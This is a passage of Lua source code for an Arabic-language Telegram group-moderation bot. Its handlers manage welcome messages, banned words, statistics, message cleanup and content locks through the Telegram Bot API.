DevAIAN:del(WAAD..'AIAN:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevAIAN:get(WAAD..'AIAN:Lock:Id:Photo'..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الايدي بـ الصوره")
DevAIAN:set(WAAD..'AIAN:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Id'..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الايدي بالتاكيد مفعل ', 1, 'md')
else
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الايدي بنجاح")
DevAIAN:del(WAAD..'AIAN:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevAIAN:get(WAAD..'AIAN:Lock:Id'..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الايدي بالتاكيد معطل ', 1, 'md')
else
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الايدي بنجاح")
DevAIAN:set(WAAD..'AIAN:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source WAAD     --
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevAIAN:setex(WAAD.."AIAN:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' or text == 'انشاء الرابط' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevAIAN:get(WAAD.."AIAN:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevAIAN:set(WAAD.."AIAN:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevAIAN:setex(WAAD.."AIAN:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
--     Source WAAD     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الترحيب بنجاح")
DevAIAN:set(WAAD.."AIAN:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الترحيب بنجاح")
DevAIAN:del(WAAD.."AIAN:Lock:Welcome"..msg.chat_id_)
end
if DevAIAN:get(WAAD..'AIAN:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevAIAN:del(WAAD..'AIAN:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAIAN:del(WAAD..'AIAN:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevAIAN:set(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل لي الترحيب الان\n⌯︙تستطيع اضافة مايلي ↫ ⤈\n⌯︙دالة عرض الاسم ↫ firstname\n⌯︙دالة عرض المعرف ↫ username', 1, 'md')
DevAIAN:set(WAAD..'AIAN:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف الترحيب")  
DevAIAN:del(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevAIAN:get(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_AIAN(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لم يتم وضع الترحيب \n⌯︙ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     Source WAAD     --
if DevAIAN:get(WAAD..'AIAN:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء حفظ الوصف", 1, 'md')
DevAIAN:del(WAAD..'AIAN:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAIAN:del(WAAD..'AIAN:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevAIAN:set(WAAD..'AIAN:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل لي الوصف الان', 1, 'md')
end
--     Source WAAD     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل لي الكلمه الان", 1, 'md') 
DevAIAN:set(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevAIAN:get(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر المنع', 1, 'md')
DevAIAN:del(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم منع الكلمه ↫ "..text, 1, 'html')
DevAIAN:del(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevAIAN:hset(WAAD..'AIAN:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل لي الكلمه الان", 1, 'md') 
DevAIAN:set(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevAIAN:get(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر الغاء المنع', 1, 'md')
DevAIAN:del(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevAIAN:hget(WAAD..'AIAN:Filters:'..msg.chat_id_, text) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevAIAN:del(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevAIAN:hdel(WAAD..'AIAN:Filters:'..msg.chat_id_, text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevAIAN:del(WAAD.."AIAN:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source WAAD     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫  الاحصائيات ⌯" then
local gps = DevAIAN:scard(WAAD.."AIAN:Groups") local users = DevAIAN:scard(WAAD.."AIAN:Users") 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙احصائيات البوت ↫ ⤈\n⌯︙عدد المشتركين ↫ ❨ '..users..' ❩\n⌯︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
--     Source WAAD     --
if text and text == 'المجموعات' and ChCheck(msg) or text and text == '↫ المجموعات ⌯' then
if not SudoBot(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطورين فقط ', 1, 'md')
else
local List = DevAIAN:smembers(WAAD.."AIAN:Groups")
local t = '⌯︙مجموعات البوت ↫ ⤈ \n'
for k,v in pairs(List) do
t = t..k.."~ : `"..v.."`\n" 
end
if #List == 0 then
t = '⌯︙لا يوجد مجموعات مفعله'
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ⌯" then
local users = DevAIAN:scard(WAAD.."AIAN:Users")
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ⌯" then
local gps = DevAIAN:scard(WAAD.."AIAN:Groups")
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
end
--     Source WAAD     --
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not DevAIAN:get(WAAD..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevAIAN:setex(WAAD..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) or text == "↫ تنظيف المشتركين ⌯" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevAIAN:smembers(WAAD.."AIAN:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevAIAN:srem(WAAD.."AIAN:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عدد المشتركين الان ↫ { '..#pv..' }\n⌯︙تم حذف ↫ { '..sendok..' } من المشتركين\n⌯︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source WAAD     --
if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) or text == "↫ تنظيف المجموعات ⌯" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevAIAN:smembers(WAAD.."AIAN:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevAIAN:srem(WAAD.."AIAN:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = WAAD, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAIAN:srem(WAAD.."AIAN:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAIAN:srem(WAAD.."AIAN:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevAIAN:srem(WAAD.."AIAN:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local WAADgp2 = (w + q)
local WAADgp3 = #group - WAADgp2
if q == 0 then
WAADgp2 = ''
else
WAADgp2 = '\n⌯︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
WAADgp1 = ''
else
WAADgp1 = '\n⌯︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙عدد الكروبات الان ↫ { '..#group..' }'..WAADgp1..WAADgp2..'\n⌯︙العدد الحقيقي الان  ↫ ( '..WAADgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source WAAD     --
if text and (text == "تفعيل امسح" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امسح بنجاح \n⌯︙مع ميزة الحذف التلقائي للميديا\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ")
DevAIAN:set(WAAD..'AIAN:Lock:Clean'..msg.chat_id_,true)  
end
if text and (text == "تعطيل امسح" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امسح بنجاح \n⌯︙مع ميزة الحذف التلقائي للميديا\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ")
DevAIAN:del(WAAD..'AIAN:Lock:Clean'..msg.chat_id_) 
end
if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$")) and Constructor(msg) then   
local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$")
if tonumber(Num) < 20 or tonumber(Num) > 1000 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بتحديد عدد اكبر من 20 واصغر من 1000 للحذف التلقائي', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevAIAN:set(WAAD..'AIAN:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevAIAN:get(WAAD..'AIAN:Lock:Clean'..msg.chat_id_) then
if DevAIAN:get(WAAD..'AIAN:CleanNum'..msg.chat_id_) then CleanNum = DevAIAN:get(WAAD..'AIAN:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevAIAN:scard(WAAD.."AIAN:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevAIAN:smembers(WAAD.."AIAN:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"⌯︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
DevAIAN:del(WAAD.."AIAN:cleaner"..msg.chat_id_)
end 
end 
if Cleaner(msg) then
if DevAIAN:get(WAAD..'AIAN:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevAIAN:scard(WAAD.."AIAN:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙عدد الميديا ↫ "..M.."\n⌯︙الحذف التلقائي ↫ "..(DevAIAN:get(WAAD..'AIAN:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD.."AIAN:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevAIAN:del(WAAD.."AIAN:cleaner"..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     Source WAAD     --
if Admin(msg) then
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
AIAN_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
AIAN_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = AIAN_Del},function(arg,data)
new = 0
AIAN_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
AIAN_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,AIAN_Del2)
end,nil)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source WAAD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if BasicConstructor(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "التعديل" then
if DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح التعديل")  
DevAIAN:del(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
if DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح تعديل الميديا")  
DevAIAN:del(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه" then
if DevAIAN:get(WAAD..'AIAN:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الفارسيه")  
DevAIAN:del(WAAD..'AIAN:Lock:Farsi'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الفشار")  
DevAIAN:set(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الطائفيه")  
DevAIAN:set(WAAD..'AIAN:Lock:Taf'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الكفر")  
DevAIAN:set(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevAIAN:get(WAAD..'AIAN:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح الفارسيه بالطرد")  
DevAIAN:del(WAAD..'AIAN:Lock:FarsiBan'..msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح البوتات")  
DevAIAN:del(WAAD.."AIAN:Lock:Bots"..msg.chat_id_)  
end
if UnLockText[2] == "التكرار" then 
DevAIAN:hdel(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevAIAN:get(WAAD..'AIAN:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم فتح التثبيت")  
DevAIAN:del(WAAD..'AIAN:Lock:Pin'..msg.chat_id_)
DevAIAN:srem(WAAD.."AIAN:Lock:Pinpin",msg.chat_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source WAAD     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الدردشه")  
DevAIAN:set(WAAD..'AIAN:Lock:Text'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الاونلاين")  
DevAIAN:set(WAAD..'AIAN:Lock:Inline'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الصور")  
DevAIAN:set(WAAD..'AIAN:Lock:Photo'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الكلايش")  
DevAIAN:set(WAAD..'AIAN:Lock:Spam'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الدخول")  
DevAIAN:set(WAAD..'AIAN:Lock:Join'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الفيديو")  
DevAIAN:set(WAAD..'AIAN:Lock:Videos'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل المتحركه")  
DevAIAN:set(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الاغاني")  
DevAIAN:set(WAAD..'AIAN:Lock:Music'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الصوت")  
DevAIAN:set(WAAD..'AIAN:Lock:Voice'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الروابط")  
DevAIAN:set(WAAD..'AIAN:Lock:Links'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل المواقع")  
DevAIAN:set(WAAD..'AIAN:Lock:Location'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل المعرفات")  
DevAIAN:set(WAAD..'AIAN:Lock:Tags'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم قفل الملفات")  
DevAIAN:set(WAAD..'AIAN:Lock:Document'..msg.chat_id_,true)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
